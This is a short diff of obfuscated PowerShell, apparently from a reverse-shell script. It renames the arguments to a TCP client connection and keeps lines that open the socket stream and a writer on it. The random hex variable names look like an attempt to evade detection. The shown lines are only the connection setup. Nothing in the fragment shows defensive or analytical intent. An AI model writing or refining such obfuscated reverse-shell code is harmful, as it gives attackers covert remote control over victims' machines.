@@ -1,4 +1,4 @@
-$3aa2ad906c2b4439a6dee0a389abb6ae = New-Object Net.Sockets.TCPClient($ipv4, $portty)
+$3aa2ad906c2b4439a6dee0a389abb6ae = New-Object Net.Sockets.TCPClient($ip, $p)
 $32c6fa2cbe4e4467b2496ec6170445a0 = $3aa2ad906c2b4439a6dee0a389abb6ae.GetStream()
 $40762deaed16419582a9e2fa022f34cb = New-Object IO.StreamWriter($32c6fa2cbe4e4467b2496ec6170445a0)
 
